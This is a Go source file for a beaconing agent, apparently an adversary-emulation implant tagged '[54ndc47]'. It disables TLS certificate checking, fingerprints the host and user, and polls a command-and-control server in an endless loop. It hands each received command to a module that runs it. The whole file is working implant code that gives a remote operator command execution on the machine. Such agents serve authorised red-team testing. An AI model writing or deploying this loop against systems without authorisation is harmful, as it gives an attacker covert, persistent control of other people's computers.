package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"time"
	"reflect"
	"./modules"
)

func stayInTouch(server string, host string, paw string, group string) {
	fmt.Println("[54ndc47] beaconing")
	commands := modules.Beacon(server, paw, host, group)
	if len(commands.([]interface{})) > 0 {
		cmds := reflect.ValueOf(commands)
		for i := 0; i < cmds.Len(); i++ {
			command := cmds.Index(i).Elem().String()
			fmt.Println("[54ndc47] running task")
			modules.Results(server, paw, command)
		}
	} else {
		time.Sleep(60 * time.Second)
	}
}

func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s$%s", host, user.Username)
	server := "https://localhost:8888"
	group := "client"

	if len(os.Args) > 1 {
		server = os.Args[1]
		group = os.Args[2]	
	} 
	for {
		stayInTouch(server, host, paw, group)
	}
}
